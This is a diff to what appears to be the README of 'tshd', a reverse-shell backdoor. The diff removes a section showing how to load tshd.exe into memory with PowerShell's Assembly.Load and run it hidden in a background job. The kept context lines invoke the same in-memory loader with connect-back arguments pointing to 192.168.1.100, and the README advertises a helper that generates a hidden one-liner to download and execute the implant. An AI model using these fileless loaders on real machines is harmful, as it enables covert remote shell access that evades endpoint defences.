@@ -139,24 +139,6 @@ $args = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")
 $entryPoint.Invoke($null, [object[]] @(,$args))
 ```
 
-#### Run in background (PowerShell)
-
-To run in the background without blocking the shell (using a Job):
-
-```powershell
-$bytes = [System.IO.File]::ReadAllBytes("tshd.exe")
-# Arguments: -c <host> -p <port> -s <secret>
-$tshdArgs = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")
-
-Start-Job -ScriptBlock {
-    param($bytes, $args)
-    # Load assembly in the job process
-    $assembly = [System.Reflection.Assembly]::Load($bytes)
-    # Invoke Main
-    $assembly.EntryPoint.Invoke($null, [object[]] @(,$args))
-} -ArgumentList $bytes, $tshdArgs
-```
-
 #### Generate PowerShell Loader Script
 
 You can use the `tshd-ps.py` helper script to generate a PowerShell one-liner that downloads (or reads) and executes `tshd.exe` in memory, in a hidden background process.
